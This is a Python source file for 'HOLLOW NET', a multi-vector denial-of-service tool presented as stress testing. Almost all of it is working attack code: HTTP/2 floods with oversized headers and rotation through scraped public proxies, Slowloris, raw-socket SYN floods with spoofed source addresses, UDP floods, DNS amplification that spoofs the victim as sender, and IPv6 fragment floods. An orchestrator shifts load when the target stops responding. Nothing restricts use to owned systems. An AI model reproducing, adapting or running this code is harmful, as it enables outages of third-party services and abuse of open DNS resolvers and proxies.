#!/usr/bin/env python3
"""
HOLLOW NET - ASCENDED Production Edition
Multi-vector, adaptive, stealth DDoS stress testing tool.

Prerequisites:
    pip install httpx[socks] h2 scapy beautifulsoup4 cloudscraper stem pysocks argparse

Run as root for SYN flood, UDP magic, raw sockets.
If cloudscraper is unavailable, JS challenges are bypassed via simple header spoofing.
"""

import sys, os, time, re, random, json, logging, signal, argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Thread, Lock, Event
from queue import Queue
from typing import List, Dict, Optional
from urllib.parse import urlparse, urljoin

# ------------- Logging Setup -------------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [HOLLOW] %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
log = logging.getLogger("HollowNet")

# ------------- Global Constants -------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/118.0"
]
REFERERS = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/"]
JA3_FINGERPRINTS = [
    # Realistic JA3 full strings from modern browsers
    "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
    "771,4865-4867-4866-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,10-11-35-16-5-13-18-51-45-43-27-17513-23-65281,29-23-24,0",
    "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
]

# ------------- Utility Functions -------------
def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def resolve_ip(host: str) -> str:
    import socket
    try:
        return socket.gethostbyname(host)
    except:
        return host

# ========= PROXY MANAGER =========
class ProxyManager:
    PROXY_SOURCES = [
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http",
        "https://www.proxy-list.download/api/v1/get?type=https",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/roosteronrails/proxy-list/main/proxies/http.txt",
    ]

    def __init__(self, refresh_interval=120):
        self.refresh_interval = refresh_interval
        self.queue = Queue()
        self.validated = set()
        self.lock = Lock()
        self.running = True
        self.refresh_thread = Thread(target=self._auto_refresh, daemon=True)
        self.refresh_thread.start()

    def _fetch_url(self, url):
        import requests
        try:
            resp = requests.get(url, timeout=10)
            return resp.text
        except:
            return ""

    def _auto_refresh(self):
        while self.running:
            log.info("ProxyManager: scraping fresh proxies...")
            for src in self.PROXY_SOURCES:
                try:
                    content = self._fetch_url(src)
                    proxies = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', content)
                    with self.lock:
                        for proxy in proxies:
                            if proxy not in self.validated:
                                self.queue.put(proxy)
                                self.validated.add(proxy)
                except Exception as e:
                    log.debug(f"Proxy source failed: {src} - {e}")
            # Validate a few proxies in background
            Thread(target=self._validate_sample, args=(20,), daemon=True).start()
            time.sleep(self.refresh_interval)

    def _validate_sample(self, n):
        import requests
        with self.lock:
            to_test = list(self.validated)[:n]
        for proxy in to_test:
            try:
                resp = requests.get("http://httpbin.org/ip", proxies={"http": f"http://{proxy}"}, timeout=5)
                if resp.status_code == 200:
                    log.debug(f"Proxy valid: {proxy}")
            except:
                with self.lock:
                    self.validated.discard(proxy)

    def get_proxy(self):
        """Return a random valid proxy or None."""
        try:
            with self.lock:
                if not self.queue.empty():
                    return self.queue.get()
        except:
            pass
        return None

    def stop(self):
        self.running = False

# ========= TARGET MAPPER =========
class TargetMapper:
    """Discovers all endpoints, forms, subdomains."""
    def __init__(self, base_url):
        self.base_url = base_url
        self.endpoints = set()
        self.forms = []

    def crawl(self, max_depth=2):
        log.info(f"TargetMapper: crawling {self.base_url}")
        try:
            import requests
            from bs4 import BeautifulSoup
            to_visit = Queue()
            to_visit.put((self.base_url, 0))
            visited = set()
            while not to_visit.empty():
                url, depth = to_visit.get()
                if depth > max_depth or url in visited:
                    continue
                visited.add(url)
                try:
                    resp = requests.get(url, timeout=5, headers={"User-Agent": random.choice(USER_AGENTS)})
                    if resp.status_code == 200:
                        self.endpoints.add(url)
                        soup = BeautifulSoup(resp.text, 'html.parser')
                        for link in soup.find_all('a', href=True):
                            href = urljoin(url, link['href'])
                            if href.startswith(self.base_url) and href not in visited:
                                to_visit.put((href, depth+1))
                        for form in soup.find_all('form'):
                            action = form.get('action')
                            method = form.get('method', 'get').lower()
                            inputs = [inp.get('name') for inp in form.find_all('input') if inp.get('name')]
                            if action:
                                full_action = urljoin(url, action)
                                self.forms.append({'url': full_action, 'method': method, 'params': inputs})
                                self.endpoints.add(full_action)
                except:
                    pass
            log.info(f"TargetMapper: found {len(self.endpoints)} endpoints, {len(self.forms)} forms")
        except ImportError:
            log.warning("BeautifulSoup not installed; crawling disabled.")

# ========= ADVANCED HTTP/2 FLOOD ENGINE =========
class HTTP2Flood:
    """Uses httpx with HTTP/2 support, JA3 randomization, proxy rotation."""
    def __init__(self, target_url, proxy_manager: Optional[ProxyManager] = None, use_cloudscraper=False):
        self.target_url = target_url
        self.proxy_manager = proxy_manager
        self.use_cloudscraper = use_cloudscraper
        self.running = True
        self.session_pool = Queue()
        self._build_sessions(50)

    def _build_sessions(self, count):
        for _ in range(count):
            try:
                client = self._create_client()
                self.session_pool.put(client)
            except:
                pass

    def _create_client(self):
        import httpx
        # Random TLS fingerprint via custom SSL context (simulated JA3)
        # Actually httpx supports http2 but not custom JA3. We'll use h2 library via httpx.
        # For true JA3 spoofing, we would use tls_client. Here we randomize ciphers.
        import ssl
        ssl_ctx = ssl.create_default_context()
        # randomize cipher order
        ciphers = ssl_ctx.get_ciphers()
        random.shuffle(ciphers)
        ssl_ctx.set_ciphers(":".join([c['name'] for c in ciphers]))  # Not perfect but changes fingerprint
        transport = httpx.HTTPTransport(retries=0, verify=False)
        limits = httpx.Limits(max_keepalive_connections=0, max_connections=1)
        return httpx.Client(http2=True, verify=False, timeout=10, transport=transport, limits=limits)

    def _get_session(self):
        if not self.session_pool.empty():
            return self.session_pool.get()
        else:
            return self._create_client()

    def _return_session(self, client):
        self.session_pool.put(client)

    def worker(self):
        while self.running:
            client = self._get_session()
            try:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Referer": random.choice(REFERERS),
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                }
                proxies = None
                if self.proxy_manager:
                    p = self.proxy_manager.get_proxy()
                    if p:
                        proxies = f"http://{p}"
                # HPACK bomb: extra large header to exhaust memory
                headers["X-Bomb"] = "A" * random.randint(1000, 4000)
                response = client.get(self.target_url, headers=headers, proxies=proxies)
                # Read content to keep connection busy
                response.read()
            except:
                pass
            finally:
                self._return_session(client)

    def launch(self, threads=200):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(self.worker) for _ in range(threads)]
            while self.running:
                time.sleep(1)
            for f in futures:
                f.cancel()

    def stop(self):
        self.running = False

# ========= SLOWLORIS (enhanced) =========
class SlowlorisAttack:
    """Connection exhaustion with dynamic pool and keep-alive."""
    def __init__(self, host, port=80, https=False):
        self.host = host
        self.port = port
        self.https = https
        self.running = True
        self.sockets = []
        self.lock = Lock()

    def _create_socket(self):
        import socket, ssl
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            if self.https:
                context = ssl.create_default_context()
                s = context.wrap_socket(s, server_hostname=self.host)
            s.connect((self.host, self.port))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {self.host}\r\n".encode())
            s.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode())
            s.send("Accept-language: en-US,en;q=0.5\r\n".encode())
            return s
        except:
            return None

    def maintain_pool(self, target_size=200):
        while self.running:
            with self.lock:
                while len(self.sockets) < target_size:
                    s = self._create_socket()
                    if s:
                        self.sockets.append(s)
            time.sleep(0.5)

    def keep_alive(self):
        while self.running:
            with self.lock:
                for i, s in enumerate(self.sockets):
                    try:
                        s.send(f"X-random: {random.randint(1000,9999)}\r\n".encode())
                    except:
                        # replace dead socket
                        new = self._create_socket()
                        if new:
                            self.sockets[i] = new
                        else:
                            self.sockets.pop(i)
            time.sleep(random.uniform(5, 15))

    def launch(self):
        Thread(target=self.maintain_pool, daemon=True).start()
        Thread(target=self.keep_alive, daemon=True).start()
        while self.running:
            time.sleep(1)

    def stop(self):
        self.running = False
        for s in self.sockets:
            try: s.close()
            except: pass

# ========= SYN FLOOD (raw socket, root) =========
class SYNFlood:
    def __init__(self, target_ip, port):
        self.target_ip = target_ip
        self.port = port
        self.running = True

    def worker(self):
        import socket, struct
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            log.error("SYN flood requires root privileges.")
            return
        while self.running:
            try:
                src_ip = random_ip()
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 4294967295)
                window = socket.htons(5840)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                    0x45, 0, 40, random.randint(0,65535), 0, 64, socket.IPPROTO_TCP, 0,
                    socket.inet_aton(src_ip), socket.inet_aton(self.target_ip))
                tcp_hdr = struct.pack("!HHLLBBHHH",
                    src_port, self.port, seq, 0, 0x50, 0x02, window, 0, 0)
                packet = ip_hdr + tcp_hdr
                sock.sendto(packet, (self.target_ip, 0))
            except:
                pass

    def launch(self, threads=100):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)

    def stop(self):
        self.running = False

# ========= UDP FLOOD =========
class UDPFlood:
    def __init__(self, target_ip, port, packet_size=1024):
        self.target_ip = target_ip
        self.port = port
        self.packet_size = packet_size
        self.running = True

    def worker(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running:
            try:
                sock.sendto(os.urandom(self.packet_size), (self.target_ip, self.port))
            except:
                pass

    def launch(self, threads=200):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)

    def stop(self):
        self.running = False

# ========= DNS AMPLIFICATION =========
class DNSAmplification:
    def __init__(self, target_ip, resolver="8.8.8.8", domain="isc.org"):
        self.target_ip = target_ip
        self.resolver = resolver
        self.domain = domain
        self.running = True

    def build_query(self):
        query = bytearray()
        query.extend(b'\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00')
        for part in self.domain.encode().split(b'.'):
            query.extend(bytes([len(part)]))
            query.extend(part)
        query.extend(b'\x00')
        query.extend(b'\x00\xff\x00\x01')  # ANY type
        return bytes(query)

    def worker(self):
        import socket, struct
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            log.error("DNS amp requires raw sockets (root).")
            return
        query = self.build_query()
        while self.running:
            try:
                src_port = random.randint(1024,65535)
                udp_len = 8 + len(query)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                    0x45, 0, 20+udp_len, random.randint(0,65535), 0, 64, socket.IPPROTO_UDP, 0,
                    socket.inet_aton(self.target_ip), socket.inet_aton(self.resolver))
                udp_hdr = struct.pack("!HHHH", src_port, 53, udp_len, 0)
                packet = ip_hdr + udp_hdr + query
                sock.sendto(packet, (self.resolver, 53))
            except:
                pass

    def launch(self, threads=100):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)

    def stop(self):
        self.running = False

# ========= IPv6 FRAG ATTACK (scapy) =========
class IPv6FragAttack:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.running = True

    def worker(self):
        from scapy.all import IPv6, IPv6ExtHdrFragment, send
        while self.running:
            pkt = IPv6(dst=self.target_ip) / IPv6ExtHdrFragment(offset=0, m=1, id=random.randint(0,2**32-1)) / ("A"*100)
            send(pkt, verbose=0)
            time.sleep(0.001)

    def launch(self, threads=50):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)

    def stop(self):
        self.running = False

# ========= FUSION ENGINE =========
class FusionEngine:
    """Orchestrates all vectors dynamically, adjusting weights based on target response."""
    def __init__(self, config):
        self.config = config
        self.attackers = []
        self.weights = {
            'http2': 0.4, 'slowloris': 0.2, 'syn': 0.15, 'udp': 0.15, 'dns': 0.05, 'ipv6frag': 0.05
        }
        self.running = True
        self.lock = Lock()

    def _target_status(self):
        # Quick check: if HTTP target still reachable, measure latency
        try:
            import requests
            start = time.time()
            r = requests.get(self.config['http_url'], timeout=3)
            return time.time() - start, r.status_code
        except:
            return 999, 0

    def adjust_weights(self):
        """If HTTP is down, shift to network floods; else keep HTTP heavy."""
        lat, code = self._target_status()
        if code == 0 or lat > 5:
            # HTTP seems down, increase SYN/UDP
            self.weights['http2'] = 0.1
            self.weights['slowloris'] = 0.1
            self.weights['syn'] = 0.3
            self.weights['udp'] = 0.4
            self.weights['dns'] = 0.1
        else:
            # reset to default
            self.weights = {
                'http2': 0.4, 'slowloris': 0.2, 'syn': 0.15, 'udp': 0.15, 'dns': 0.05, 'ipv6frag': 0.05
            }

    def start(self):
        # Initialize attackers
        proxy_mgr = ProxyManager() if self.config.get('auto_proxy', False) else None
        http2 = HTTP2Flood(self.config['http_url'], proxy_mgr)
        slow = SlowlorisAttack(self.config['host'], int(self.config.get('port', 80)),
                               self.config.get('https', False))
        syn = SYNFlood(resolve_ip(self.config['host']), int(self.config.get('port', 80)))
        udp = UDPFlood(resolve_ip(self.config['host']), int(self.config.get('port', 80)))
        dns = DNSAmplification(resolve_ip(self.config['host']))
        ipv6 = IPv6FragAttack(resolve_ip(self.config['host']))

        attackers = {'http2': http2, 'slowloris': slow, 'syn': syn, 'udp': udp, 'dns': dns, 'ipv6frag': ipv6}
        total_threads = self.config.get('total_threads', 500)

        # Launch each with weight-based thread allocation
        threads = []
        for name, atk in attackers.items():
            tcount = int(total_threads * self.weights.get(name, 0.1))
            log.info(f"Fusion: starting {name} with {tcount} threads")
            if tcount > 0:
                if name == 'http2':
                    t = Thread(target=http2.launch, args=(tcount,))
                elif name == 'slowloris':
                    t = Thread(target=slow.launch)
                elif name == 'syn':
                    t = Thread(target=syn.launch, args=(tcount,))
                elif name == 'udp':
                    t = Thread(target=udp.launch, args=(tcount,))
                elif name == 'dns':
                    t = Thread(target=dns.launch, args=(tcount,))
                elif name == 'ipv6frag':
                    t = Thread(target=ipv6.launch, args=(tcount,))
                t.daemon = True
                t.start()
                threads.append(t)

        # Dynamic adjustment loop
        start_time = time.time()
        duration = self.config.get('duration', 60)
        try:
            while self.running and time.time() - start_time < duration:
                self.adjust_weights()
                # Optionally change thread allocation dynamically (not implemented for brevity)
                time.sleep(10)
        except KeyboardInterrupt:
            pass
        finally:
            # Stop all
            for atk in attackers.values():
                atk.stop()
            self.running = False
            for t in threads:
                t.join(timeout=5)
            if proxy_mgr:
                proxy_mgr.stop()
            log.info("Fusion attack concluded.")

# ========= MAIN CLI =========
def main():
    parser = argparse.ArgumentParser(description="HOLLOW NET - Ascended DDoS Tool")
    parser.add_argument("target", help="Target URL or IP (e.g., http://example.com or 10.0.0.1)")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-t", "--threads", type=int, default=500, help="Total threads (default: 500)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds (default: 60)")
    parser.add_argument("--ssl", action="store_true", help="Use HTTPS for Slowloris")
    parser.add_argument("--auto-proxy", action="store_true", help="Auto-scrape and use proxies")
    parser.add_argument("--crawl", action="store_true", help="Crawl target for endpoints before attack")
    parser.add_argument("--cloudscraper", action="store_true", help="Use cloudscraper to bypass JS challenges")
    args = parser.parse_args()

    target = args.target
    # Determine host and scheme
    parsed = urlparse(target)
    if parsed.scheme in ('http', 'https'):
        host = parsed.hostname
        scheme = parsed.scheme
        http_url = f"{scheme}://{host}" + (f":{args.port}" if args.port not in (80, 443) else "")
        if parsed.path:
            http_url += parsed.path
    else:
        host = target
        http_url = f"http://{host}" + (f":{args.port}" if args.port != 80 else "")

    if args.crawl:
        mapper = TargetMapper(http_url)
        mapper.crawl()
        # Could use endpoints for distributed HTTP flood (not implemented here)

    config = {
        'host': host,
        'port': args.port,
        'https': args.ssl,
        'http_url': http_url,
        'total_threads': args.threads,
        'duration': args.duration,
        'auto_proxy': args.auto_proxy,
    }

    engine = FusionEngine(config)
    engine.start()

if __name__ == "__main__":
    # Ensure scapy is available for IPv6 attacks, but not mandatory
    try:
        import scapy.all
    except ImportError:
        pass
    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
    main()
